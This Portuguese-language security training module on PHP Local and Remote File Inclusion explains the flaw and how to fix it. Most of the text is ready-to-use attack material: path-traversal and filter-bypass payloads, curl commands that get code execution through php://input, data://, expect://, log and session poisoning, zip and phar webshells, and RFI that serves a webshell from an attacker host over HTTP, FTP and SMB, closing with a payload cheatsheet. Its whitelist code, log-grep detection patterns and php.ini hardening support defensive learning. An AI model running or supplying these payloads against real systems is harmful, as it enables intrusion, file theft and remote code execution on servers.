---
title: "File Inclusion"
---

# File Inclusion (LFI / RFI)

## A Falha: Caminho de Arquivo Controlado pelo Usuário Sem Validação

File Inclusion acontece quando uma aplicação usa input do usuário para construir o caminho de um arquivo que será incluído e executado — `include($_GET['page'])`, `require($template)`, `include_once($lang . ".php")`.

A suposição de design incorreta: o desenvolvedor imagina que o usuário enviará valores como `"home"`, `"about"`, `"en"` — nomes curtos que mapeiam para arquivos da aplicação. Não considera que o mesmo parâmetro pode conter `"../../../etc/passwd"` ou um wrapper PHP que executa código arbitrário.

**Por que o desenvolvedor cria essa falha**: a funcionalidade de carregar conteúdo dinamicamente com base em parâmetros de URL é conveniente — permite trocar idiomas, templates ou seções de página sem criar rotas separadas. O código natural é `include($_GET['page'] . '.php')`. O desenvolvedor valida o fluxo normal, não o abuso.

**A diferença entre o código correto e o vulnerável**:

```php
// VULNERÁVEL — qualquer path funciona
include($_GET['page']);
// Input: "../../../../etc/passwd" -> inclui /etc/passwd
// Input: "php://input" -> executa código PHP do corpo POST
// Input: "data://text/plain;base64,..." -> executa payload inline

// MELHOR, mas ainda vulnerável — extensão não protege suficientemente
include($_GET['page'] . '.php');
// Input: "../../../../etc/passwd%00" -> null byte trunca .php (PHP < 5.3.4)

// CORRETO — whitelist explícita: input do usuário nunca constrói o path
$allowed_pages = [
    'home'    => '/var/www/pages/home.php',
    'about'   => '/var/www/pages/about.php',
    'contact' => '/var/www/pages/contact.php',
];
$page = $_GET['page'];
if (!array_key_exists($page, $allowed_pages)) {
    die('Página inválida');
}
include($allowed_pages[$page]);
// Qualquer input fora da whitelist é rejeitado — o path nunca é construído com input do usuário
```

**Consequência real**: a falha escala de leitura de arquivos sensíveis (LFI básico) para RCE completo via log poisoning, session poisoning, PHP wrappers ou Remote File Inclusion — e o mecanismo de escalada não é óbvio para quem analisa o código pela primeira vez.

---

## Causa Raiz

O sistema de arquivos não faz distinção entre "arquivos da aplicação" e "arquivos do sistema". Quando a aplicação usa input do usuário para construir um path, o kernel do SO aceita qualquer path válido — incluindo traversais com `../` que sobem da raiz do projeto para qualquer lugar no sistema.

```php
// Código vulnerável típico
include($_GET['page'] . '.php');

// O que o desenvolvedor imagina:
// GET /index.php?page=home -> include("home.php")
// GET /index.php?page=about -> include("about.php")

// O que o atacante faz:
// GET /index.php?page=../../../../etc/passwd%00
// -> include("../../../../etc/passwd\0.php")
// -> PHP interpreta \0 como fim de string, inclui /etc/passwd

// Outro vetor:
// GET /index.php?page=php://input
// -> include("php://input") executa código PHP do corpo POST
```

O que está faltando: o path do arquivo nunca deve ser construído a partir de input do usuário. A aplicação deve manter uma lista fixa de arquivos permitidos e mapear o input do usuário para um dos itens dessa lista.

---

## Mecanismo de Inclusão: Path Traversal e Execução de Arquivos Locais

### LFI Básico

A aplicação recebe um parâmetro de caminho e inclui o arquivo diretamente:

```php
// Código vulnerável típico
include($_GET['page'] . '.php');
```

Requisição normal:
```
http://alvo.com/index.php?language=en
```

Requisição maliciosa:
```
http://alvo.com/index.php?language=../../../../etc/passwd
```

O servidor resolve o path traversal e inclui `/etc/passwd`. Dependendo da implementação, a extensão `.php` pode ou não ser concatenada.

### Leitura de Arquivos Sensíveis via LFI

Arquivos comuns alvejados:

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/lib/php/sessions/sess_PHPSESSID
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\xampp\apache\logs\access.log
```

---

## Discovery

### Fuzzing Manual

Testar parâmetros que referenciam arquivos:
```
?page=
?file=
?path=
?lang=
?view=
?template=
?include=
```

### Fuzzing com ffuf

```bash
# Wordlist específica para LFI
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://alvo.com/index.php?language=FUZZ' \
     -fs 2287

# Descoberta de parâmetros vulneráveis
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM \
     -u 'http://alvo.com/index.php?PARAM=../../../../etc/passwd' \
     -fs 0
```

### Path Traversal com Bypass de Filtros

```
# Básico
../../../../etc/passwd

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd

# Double URL encoded
..%252F..%252F..%252Fetc%252Fpasswd

# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00

# Traversal com barra invertida (Windows)
..\..\..\..\windows\win.ini

# Bypass de filtro que remove "../"
....//....//....//etc/passwd
..././..././..././etc/passwd

# Combinação
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

## Exploitation

### PHP Wrappers

#### php://filter — Leitura de Código Fonte

```bash
# Base64 encode para evitar execução
http://alvo.com/index.php?language=php://filter/convert.base64-encode/resource=index

# Decodificar resultado
echo "BASE64AQUI" | base64 -d

# Chain de filtros
http://alvo.com/index.php?language=php://filter/read=convert.base64-encode/resource=config.php
```

#### php://input — Execução de Código via POST

```bash
curl -s -X POST "http://alvo.com/index.php?language=php://input" \
     --data '<?php system($_GET["cmd"]); ?>'

# Depois executar comandos
curl -s "http://alvo.com/index.php?language=php://input&cmd=id" \
     --data '<?php system($_GET["cmd"]); ?>'
```

#### data:// — Injeção Inline de Payload

```bash
# Payload direto em texto
curl -s "http://alvo.com/index.php?language=data://text/plain,<?php system('id'); ?>"

# Base64 encoded
echo '<?php system($_GET["cmd"]); ?>' | base64
# resultado: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

curl -s "http://alvo.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id"
```

#### expect:// — Execução Direta (módulo não padrão)

```bash
http://alvo.com/index.php?language=expect://id
http://alvo.com/index.php?language=expect://whoami
```

### Log Poisoning via Apache Access Log

**Mecanismo**: o servidor registra o User-Agent de cada requisição nos logs de acesso. Se o log estiver acessível via LFI e a aplicação executa o conteúdo incluído como PHP, o atacante pode injetar código PHP no User-Agent, que fica persistido no log. Na próxima requisição com LFI apontando para o log, o PHP embutido é executado.

```bash
# Passo 1: injetar PHP no User-Agent via curl
curl -s "http://alvo.com/index.php" \
     -A '<?php system($_GET["cmd"]); ?>'
# O log agora contém: ... "<?php system($_GET["cmd"]); ?>" ...

# Passo 2: verificar se log foi escrito
curl -s "http://alvo.com/index.php?language=/var/log/apache2/access.log"

# Passo 3: executar comandos — o PHP no log é executado
curl -s "http://alvo.com/index.php?language=/var/log/apache2/access.log&cmd=id"

# Logs alternativos
/var/log/nginx/access.log
/var/log/sshd.log
/var/log/mail.log
/proc/self/fd/0        # stdin
/proc/self/fd/1        # stdout
/proc/self/fd/2        # stderr
```

### PHP Session Poisoning

**Mecanismo**: sessões PHP são armazenadas como arquivos no servidor (`/var/lib/php/sessions/sess_PHPSESSID`). Se a aplicação salva input do usuário nos dados de sessão, o atacante pode envenenar o arquivo de sessão com código PHP. A inclusão posterior desse arquivo via LFI resulta em RCE.

```bash
# Passo 1: verificar PHPSESSID no cookie
# Passo 2: arquivo de sessão fica em:
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID

# Passo 3: envenenar a sessão (ex: parâmetro 'language' salvo em sessão)
curl -s "http://alvo.com/index.php?language=<?php system(\$_GET['cmd']); ?>" \
     -b "PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd"
# O arquivo de sessão agora contém o payload PHP

# Passo 4: incluir o arquivo de sessão e executar
curl -s "http://alvo.com/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id"
```

### Zip Wrapper — Upload + LFI = RCE

```bash
# Criar webshell dentro de ZIP renomeado como imagem
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Fazer upload do shell.jpg
# Incluir via wrapper zip://
curl -s "http://alvo.com/index.php?language=zip://./uploads/shell.jpg%23shell.php&cmd=id"
```

### Phar Wrapper

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
# Upload shell.jpg
# Incluir via phar://
curl -s "http://alvo.com/index.php?language=phar://./uploads/shell.jpg%2Fshell.txt&cmd=id"
```

---

## RFI (Remote File Inclusion)

Para RFI funcionar, `allow_url_include = On` deve estar habilitado no PHP.

### Verificar se RFI está habilitado

```bash
# Tentar incluir URL externa
http://alvo.com/index.php?language=http://seuvps.com/shell.txt

# Verificar com burp se há conexão de saída
```

### Servir Shell via HTTP

```bash
# No atacante — preparar o payload
echo '<?php system($_GET["cmd"]); ?>' > shell.txt

# Servir o arquivo
python3 -m http.server 80

# Incluir via RFI
curl -s "http://alvo.com/index.php?language=http://ATACANTE_IP/shell.txt&cmd=id"
```

### Servir Shell via FTP

```bash
# Instalar pyftpdlib
pip3 install pyftpdlib

# Iniciar servidor FTP anônimo
sudo python3 -m pyftpdlib -p 21

# Incluir via RFI FTP
curl -s "http://alvo.com/index.php?language=ftp://ATACANTE_IP/shell.txt&cmd=id"
```

### Servir Shell via SMB (Windows)

```bash
# Criar servidor SMB com impacket
sudo impacket-smbserver -smb2support share $(pwd)

# Incluir via RFI SMB (sem precisar de allow_url_include em alguns casos)
http://alvo.com/index.php?language=\\ATACANTE_IP\share\shell.php
```

---

## Bypass de Filtros e Restrições

### Bypass de Extensão Forçada

```bash
# Null byte (PHP < 5.3.4)
http://alvo.com/index.php?language=../../../../etc/passwd%00

# Truncamento de path (PHP < 5.3 — limite de 4096 chars)
http://alvo.com/index.php?language=non_existing_directory/../../../etc/passwd/./././[MUITAS BARRAS]

# Wrapper que ignora extensão
http://alvo.com/index.php?language=php://filter/convert.base64-encode/resource=../../../../etc/passwd
```

### Bypass de Filtro que Remove "../"

```bash
# Recursivo
....//....//....//etc/passwd

# Encoded
..%2F..%2F..%2Fetc%2Fpasswd

# Combinações de unicode
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

---

## Automação

### LFISuite

```bash
git clone https://github.com/D35m0nd142/LFISuite
python3 LFISuite.py
```

### liffy

```bash
git clone https://github.com/mzfr/liffy
python3 liffy.py -u "http://alvo.com/index.php?language=" -f /etc/passwd
```

### wfuzz para LFI

```bash
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      --hc 404 \
      "http://alvo.com/index.php?language=FUZZ"
```

### ffuf completo com filtro de tamanho

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://alvo.com/index.php?language=FUZZ' \
     -fs 2287 \
     -mc 200 \
     -t 50
```

---

## Detecção e Mitigação

### Do Lado do Defensor

**Logs de Acesso** — buscar padrões suspeitos:
```bash
# Buscar path traversal nos logs
grep -E "\.\./|%2e%2e|%252e" /var/log/apache2/access.log

# Buscar tentativas de leitura de /etc/passwd
grep "etc/passwd" /var/log/apache2/access.log

# Buscar acesso a logs (indica possível log poisoning)
grep "var/log" /var/log/apache2/access.log

# Buscar wrappers PHP nos parâmetros
grep -E "php://|data://|expect://|zip://|phar://" /var/log/apache2/access.log
```

**WAF / IDS** — regras OWASP ModSecurity para detectar:
- `../` em parâmetros de URL ou POST
- `php://`, `data://`, `expect://`, `zip://`, `phar://` em parâmetros
- Acesso a `/etc/passwd`, `/etc/shadow`, `/proc/`

### Prevenção

```php
// Whitelist de arquivos permitidos — nunca construir path com input do usuário
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed)) {
    die('Página inválida');
}

// Input do usuário é apenas uma chave — o path é determinado pela aplicação
include('/var/www/pages/' . $page . '.php');

// Alternativa com mapeamento explícito
$pages = [
    'home'    => '/var/www/pages/home.php',
    'about'   => '/var/www/pages/about.php',
    'contact' => '/var/www/pages/contact.php',
];
if (!isset($pages[$page])) {
    die('Página inválida');
}
include($pages[$page]);
```

**Configurações PHP seguras** (`php.ini`):
```ini
allow_url_fopen = Off
allow_url_include = Off
open_basedir = /var/www/html
```

---

## Cheatsheet Rápido

| Técnica | Payload |
|---------|---------|
| Path Traversal básico | `../../../../etc/passwd` |
| PHP filter base64 | `php://filter/convert.base64-encode/resource=index` |
| PHP input (POST) | `php://input` + body `<?php system('id');?>` |
| Data inline | `data://text/plain;base64,BASE64PAYLOAD` |
| Expect | `expect://id` |
| Log Apache | `/var/log/apache2/access.log` |
| Sessão PHP | `/var/lib/php/sessions/sess_SESSIONID` |
| Zip wrapper | `zip://shell.jpg%23shell.php` |
| Phar wrapper | `phar://shell.jpg/shell.txt` |
| RFI HTTP | `http://ATACANTE/shell.txt` |
| RFI FTP | `ftp://ATACANTE/shell.txt` |
| RFI SMB | `\\ATACANTE\share\shell.php` |

---

## Módulos Relacionados

LFI e XXE resultam ambos em leitura de arquivo local, mas por mecanismos diferentes — LFI via `include()` no lado do servidor, XXE via entidade `SYSTEM "file://"` no parser XML. A combinação com File Upload é clássica: o arquivo malicioso é colocado no servidor via upload e depois incluído via LFI (zip wrapper, log poisoning via upload de avatar), tornando os dois vetores complementares — ver `02_file_upload.md`. Log poisoning em LFI também funciona como "injeção diferida" análoga a Command Injection: o código malicioso é persistido em log antes de ser executado via inclusão.

**Referências externas:** HTB Bug Bounty Hunter Path — File Inclusion (módulo 16) · PayloadsAllTheThings: File Inclusion · OWASP Testing Guide — LFI/RFI · SecLists: `/Fuzzing/LFI/`
